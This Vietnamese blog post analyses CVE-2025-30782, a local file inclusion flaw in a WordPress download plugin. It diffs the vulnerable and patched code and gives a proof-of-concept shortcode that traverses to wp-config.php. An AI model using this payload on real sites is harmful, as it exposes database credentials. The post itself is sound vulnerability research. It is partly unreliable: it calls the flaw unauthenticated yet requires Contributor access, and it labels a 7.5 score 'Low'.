---
title: CVE-2025-30782 Analysis & POC
description: Security Vulnerability in WordPress Subscribe to Download Lite Plugin.
date: 2025-10-16 19:00:00 +0700
categories: [CVE Analysis]
tags: [analyst, plugin, lfi]
images: ["app.png"]
featuredImage: "app.png"

lightgallery: true

toc:
  auto: false
---

<!--more-->

## CVE & Basic Info
Plugin **Subscribe to Download Lite** phiên bản **≤ 1.2.9** chứa lỗ hổng **Local File Inclusion** cho phép kẻ tấn công không cần xác thực điều khiển tham số file trong lệnh `include/require`, từ đó chèn hoặc đọc các tệp cục bộ trên máy chủ (ví dụ file cấu hình chứa credential), dẫn tới rò rỉ thông tin nhạy cảm và trong một số cấu hình có thể dẫn tới thực thi mã.

* **CVE ID**: [CVE-2025-30782](https://www.cve.org/CVERecord?id=CVE-2025-30782)
* **Vulnerability Type**: Local File Inclusion
* **Affected Versions**: <= 1.2.9
* **Patched Versions**: 1.3.0
* **CVSS severity**: Low (7.5)
* **Required Privilege**: Contributor
* **Product**: [WordPress Subscribe to Download Lite Plugin](https://wordpress.org/plugins/subscribe-to-download-lite/)

## Requirements
* **Local WordPress & Debugging**: [Local WordPress and Debugging](https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/).
* **Plugin versions** - **Subscribe to Download Lite**: **1.2.9** (vulnerable) và **1.3.0** (patched).
* **Diff tool** - [**Meld**](https://meldmerge.org/) hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản.

## Analysis

### Patch diff

**Bản lỗi**:

```phtml {filename="form-template.php v1.2.9" hl_lines=[7]}
<div class="stdl-form-wrap stdl-<?php echo esc_attr($form_template); ?> stdl-alias>">
    <form method="post" action="" class="stdl-subscription-form" data-form-alias="stdl">
        <?php
        do_action('stdl_before_form', $form_details);

        if (file_exists(STDL_PATH . 'inc/views/frontend/form-templates/' . $form_template . '.php')) {
            include(STDL_PATH . 'inc/views/frontend/form-templates/' . $form_template . '.php');
        }
        do_action('stdl_after_form', $form_details);
        ?>
    </form>
</div>
```

Trong phiên bản lỗi, `$form_template` được concat vào chuỗi và include nhưng không xác thực giá trị đầu vào => nguy cơ LFI xảy ra, ví dụ:

```php
$form_template = '../../../../../../../wp-config'
```

**Bản vá**:

```phtml {filename="form-template.php v1.3.0" hl_lines=[7]}
<div class="stdl-form-wrap stdl-<?php echo esc_attr($form_template); ?> stdl-alias>">
    <form method="post" action="" class="stdl-subscription-form" data-form-alias="stdl">

        <?php
        do_action('stdl_before_form', $form_details);

        $base_dir = realpath(STDL_PATH . 'inc/views/frontend/form-templates') . DIRECTORY_SEPARATOR;
        $sanitized_template = basename($form_template) . '.php';
        $file_path = realpath($base_dir . $sanitized_template);

        if ($file_path && strpos($file_path, $base_dir) === 0 && file_exists($file_path)) {
            include($file_path);
        }
        do_action('stdl_after_form', $form_details);
        ?>
    </form>
</div>
```

Bản vá sử dụng [`basename()`](https://www.php.net/manual/en/function.basename.php) để lấy phần tên file của `$form_template` loại bỏ các ký tự traversal sequence `../`, ví dụ:

```py
../../../../../../payload.pdf -> payload.pdf
```

Sau đó concat vào `$base_dir` và lấy đường dẫn tuyệt đối bằng [`realpath`](https://www.php.net/manual/en/function.realpath.php) rồi `include()` => triệt tiêu hoàn toàn khả năng **LFI**.
 
### Vulnerable Code 
`form-template.php` chứa code có lỗ hổng ở trên được gọi trong `stdl-shortcode.php`

```phtml {filename="stdl-shortcode.php v1.2.9" hl_lines=[8, 18]}
<?php
$form_template = (!empty($atts['template'])) ? $atts['template'] : $form_details['layout']['template'];
if (isset($_COOKIE['stdl_encryption_key']) && $this->check_if_already_subscribed($_COOKIE['stdl_encryption_key']) && empty($form_details['general']['always_show'])) {
    // other logic
} else {
    // other logic
    if ($display_type == 'direct') {
        include(STDL_PATH . 'inc/views/frontend/form-template.php');
    } else {
        ?>
        <div class="stdl-popup-outerwrap <?php echo esc_attr($popup_alias_class); ?>">
            <input type="button" class="stdl-popup-trigger stdl-popup-<?php echo esc_attr($form_template); ?>" value="<?php echo esc_attr($popup_trigger_text); ?>">
            <div class="stdl-popup-innerwrap" style="display:none;">
                <div class="stdl-overlay stdl-popup-wrapper">

                    <div class="stdl-popup-contetn-wrap">
                        <a href="javascript:void(0)" class="stdl-popup-close"><i class="fas fa-times"></i></a>
                            <?php include(STDL_PATH . 'inc/views/frontend/form-template.php');
                            ?>
                    </div>
                </div>
            </div>
        </div>
        <?php
    }
}
```

`$form_template` là giá trị của `$atts['template']`

Theo kinh nghiệm phân tích CVE trên WordPress plugin của tôi, `$atts` thường là các attribute của shortcode, ví dụ:

```
[pornhub id=69]
```

Có thể thấy rằng file `form-template.php` **luôn được include** trong khối `if-else` nằm bên trong phần `else`, **khi cookie `stdl_encryption_key` không tồn tại** (tức là người dùng chưa đăng ký hoặc chưa có khóa mã hóa hợp lệ).

`stdl-shortcode.php` được `include` trong callback của shortcode `subscribe_to_download_form` với `atts` là mảng các attribute của shortcode.

```php {filename="class-stdl-shortcode.php v1.2.9" hl_lines=[2,8]}
function __construct() {
    add_shortcode('subscribe_to_download_form', array($this, 'generate_shortcode_output'));
}

function generate_shortcode_output($atts) {
    wp_enqueue_style('stdl-frontend-custom', STDL_CSS_DIR . '/stdl-custom.css', array(), STDL_VERSION);
    ob_start();
    include(STDL_PATH . 'inc/views/frontend/stdl-shortcode.php');
    $form_html = ob_get_contents();
    ob_clean();
    return $form_html;
}
```

## Exploit
### Proof of Concept (PoC)

#### Step 1

Đăng nhập vào WordPress bằng tài khoản Contributor có đặc quyền thấp nhất để tạo post.

#### Step 2

Tạo post với shortcode

```shortcode
[subscribe_to_download_form template='../../../../../../../wp-config']
```

**Result**:

Debugger đã nhảy đến `wp-config.php`

{{< figure src="result.png" caption="Kết quả LFI thành công" >}}

## Conclusion

Phiên bản **≤ 1.2.9** của Subscribe to Download Lite cho phép LFI vì `include()` dùng `$atts['template']` chưa được xác thực; lỗ hổng đã được vá trong **1.3.0** bằng `basename()` + `realpath()` và kiểm tra `base_dir`. Cập nhật ngay.

## Key takeaways

* Input từ shortcode không được tin cậy — không include trực tiếp.
* Patch (v1.3.0) dùng `basename()` + `realpath()` + so sánh với thư mục cho phép.
* Hành động: cập nhật plugin, whitelist/validate attributes.
* Giám sát logs cho ký tự `../` trong tham số template.

## References

[File Inclusion/Path traversal — Hacktrick](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=lfi#lfi--rfi-using-php-wrappers--protocols)

[ WordPress Subscribe to Download Lite Plugin <= 1.2.9 is vulnerable to Local File Inclusion ](https://patchstack.com/database/wordpress/plugin/subscribe-to-download-lite/vulnerability/wordpress-subscribe-to-download-lite-plugin-1-2-9-local-file-inclusion-vulnerability?_s_id=cve)
